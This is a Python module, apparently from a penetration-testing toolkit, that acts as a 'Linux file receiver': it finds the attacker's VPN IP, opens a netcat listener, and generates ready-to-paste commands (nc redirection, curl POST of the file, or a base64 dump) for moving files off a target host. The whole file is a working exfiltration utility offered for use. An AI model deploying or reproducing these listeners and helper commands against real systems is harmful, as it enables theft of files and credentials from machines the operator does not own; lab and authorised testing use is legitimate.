import base64
import shutil
import socket
import subprocess

from pathlib import Path


# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
M = '\033[35m'
W_BOLD = '\033[1m'


# =========================================================
# HELPERS
# =========================================================

def detect_ip():

    try:
        result = subprocess.check_output(
            ["ip", "-br", "addr", "show", "dev", "tun0"],
            text=True
        )

        parts = result.split()

        if len(parts) >= 3:
            return parts[2].split("/")[0]

    except Exception:
        pass

    try:

        s = socket.socket(
            socket.AF_INET,
            socket.SOCK_DGRAM
        )

        s.connect(("1.1.1.1", 80))

        ip = s.getsockname()[0]

        s.close()

        return ip

    except Exception:

        return "127.0.0.1"


def copy_clipboard(text):

    try:

        import pyperclip

        pyperclip.copy(text)

        return True

    except Exception:

        return False


def require_outfile(args):

    outfile = getattr(args, "file", None)

    if not outfile:

        print(
            f"\n{R}[!] Missing output filename{W}"
        )

        return None

    return Path(outfile)


# =========================================================
# NC RECEIVER
# =========================================================

def mode_nc(
    outfile,
    ip,
    port
):

    helper = (
        f"nc {ip} {port} < {outfile.name}"
    )

    print(
        f"\n{M}=== NC ==={W}\n"
    )

    print(helper)

    copy_clipboard(helper)

    print(
        f"\n{G}→ helper copied to clipboard{W}"
    )

    print(
        f"\n{Y}[*] Listening on {port}"
        f" -> {outfile}{W}"
    )

    subprocess.run(
        f"nc -lvnp {port} > '{outfile}'",
        shell=True
    )


# =========================================================
# HTTP RECEIVER
# =========================================================

def mode_http(
    outfile,
    ip,
    port
):

    helper = (
        f"curl -X POST "
        f"--data-binary @{outfile.name} "
        f"http://{ip}:{port}"
    )

    print(
        f"\n{M}=== HTTP ==={W}\n"
    )

    print(helper)

    copy_clipboard(helper)

    print(
        f"\n{G}→ helper copied to clipboard{W}"
    )

    print(
        f"\n{Y}[*] Listening on {port}"
        f" -> {outfile}{W}"
    )

    subprocess.run(
        f"nc -lvnp {port} > '{outfile}'",
        shell=True
    )


# =========================================================
# OFFLINE RECEIVER
# =========================================================

def mode_offline(outfile):

    helper = (
        f"echo; base64 {outfile.name}"
        f" | tr -d '\\n'; echo;"
    )

    print(
        f"\n{M}=== OFFLINE ==={W}\n"
    )

    print(helper)

    copy_clipboard(helper)

    print(
        f"\n{G}→ helper copied to clipboard{W}"
    )

    print(
        f"\nPaste base64 now "
        f"(Ctrl-D when done)\n"
    )

    data = input()

    decoded = base64.b64decode(data)

    outfile.write_bytes(decoded)

    print(
        f"\n{G}[+] Saved -> {outfile}{W}"
    )


# =========================================================
# MENU
# =========================================================

def choose_mode():

    print(
        f"\n{W_BOLD}"
        f"[*] LINUX FILE RECEIVER"
        f"{W}"
    )

    print(
        f"\n  {B}[1]{W} NC"
    )

    print(
        f"  {B}[2]{W} HTTP"
    )

    print(
        f"  {B}[3]{W} Offline Base64"
    )

    print()

    choice = input(
        f"{B}select{W}> "
    ).strip()

    return {
        "1": "nc",
        "2": "http",
        "3": "offline",
    }.get(choice)


# =========================================================
# PUBLIC API
# =========================================================

def receive_file(
    outfile,
    method=None,
    ip=None,
    port=None
):

    outfile = Path(outfile)

    if not ip:
        ip = detect_ip()

    if not method:
        method = choose_mode()

    if method == "nc":

        mode_nc(
            outfile,
            ip,
            port or 9001
        )

    elif method == "http":

        mode_http(
            outfile,
            ip,
            port or 8080
        )

    elif method == "offline":

        mode_offline(outfile)


def run(data=None, cred=None, args=None):

    outfile = require_outfile(args)

    if not outfile:
        return data

    method = getattr(
        args,
        "method",
        None
    )

    receive_file(
        outfile=outfile,
        method=method
    )

    return data
